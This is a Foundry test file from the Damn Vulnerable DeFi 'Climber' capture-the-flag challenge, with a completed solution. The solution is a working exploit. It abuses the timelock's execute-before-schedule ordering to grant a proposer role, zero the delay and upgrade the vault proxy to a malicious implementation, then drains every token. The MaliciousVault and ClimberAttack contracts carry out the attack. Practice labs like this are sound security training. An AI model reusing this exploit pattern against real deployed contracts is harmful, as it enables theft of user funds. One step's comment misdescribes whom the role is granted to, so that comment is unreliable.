// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract ClimberChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address proposer = makeAddr("proposer");
    address sweeper = makeAddr("sweeper");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TIMELOCK_DELAY = 60 * 60;

    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the vault behind a proxy,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vault = ClimberVault(
            address(
                new ERC1967Proxy(
                    address(new ClimberVault()), // implementation
                    abi.encodeCall(ClimberVault.initialize, (deployer, proposer, sweeper)) // initialization data
                )
            )
        );

        // Get a reference to the timelock deployed during creation of the vault
        timelock = ClimberTimelock(payable(vault.owner()));

        // Deploy token and transfer initial token balance to the vault
        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(vault.getSweeper(), sweeper);
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertNotEq(vault.owner(), address(0));
        assertNotEq(vault.owner(), deployer);

        // Ensure timelock delay is correct and cannot be changed
        assertEq(timelock.delay(), TIMELOCK_DELAY);
        vm.expectRevert(CallerNotTimelock.selector);
        timelock.updateDelay(uint64(TIMELOCK_DELAY + 1));

        // Ensure timelock roles are correctly initialized
        assertTrue(timelock.hasRole(PROPOSER_ROLE, proposer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, deployer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, address(timelock)));

        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_climber() public checkSolvedByPlayer {
        // @audit-info prepare batch operation 
        MaliciousVault maliciousImpl = new MaliciousVault();
        ClimberAttack attack = new ClimberAttack(timelock);
        

        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory data = new bytes[](4);


            
        // 1. Grant proposer role to timelock itself
        targets[0] = address(timelock);
        values[0] = 0;
        data[0] = abi.encodeCall(timelock.grantRole, (PROPOSER_ROLE, address(attack)));

        // 2. Set delay to 0
        targets[1] = address(timelock);
        values[1] = 0;
        data[1] =abi.encodeCall(timelock.updateDelay, (uint64(0)));

        // 3. Upgrade vault to malicious implementation
        targets[2] = address(vault);
        values[2] = 0;
        data[2] =abi.encodeCall(vault.upgradeToAndCall, (address(maliciousImpl), bytes("")));

        // 4. Schedule this same batch
        targets[3] = address(attack);
        values[3] = 0;
        data[3] = abi.encodeCall(attack.schedule, ());
        
        attack.setBatch(targets, values, data);

        
        // Execute the whole batch
        timelock.execute(targets, values, data, bytes32(0));

        // Vault is now malicious — drain everything
        // maliciousImpl.setRecovery(recovery);
        // maliciousImpl.sweepFundss(address(token));

        MaliciousVault(address(vault)).setRecovery(recovery);
        MaliciousVault(address(vault)).sweepFundss(address(token));

    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}

contract MaliciousVault is ClimberVault {
    address public recovery;

    function setRecovery(address _recovery) external {
        recovery = _recovery;
    }

    function sweepFundss(address token) external {
        DamnValuableToken(token).transfer(
            recovery,
            DamnValuableToken(token).balanceOf(address(this))
        );
    }
}

contract ClimberAttack {
    ClimberTimelock immutable timelock;
    address[] targets;
    uint256[] values;
    bytes[] data;

    constructor(ClimberTimelock _timelock) {
        timelock = _timelock;
    }

    function setBatch(
        address[] memory _targets,
        uint256[] memory _values,
        bytes[] memory _data
    ) external {
        targets = _targets;
        values = _values;
        data = _data;
    }

    function schedule() external {
        timelock.schedule(targets, values, data, bytes32(0));
    }
}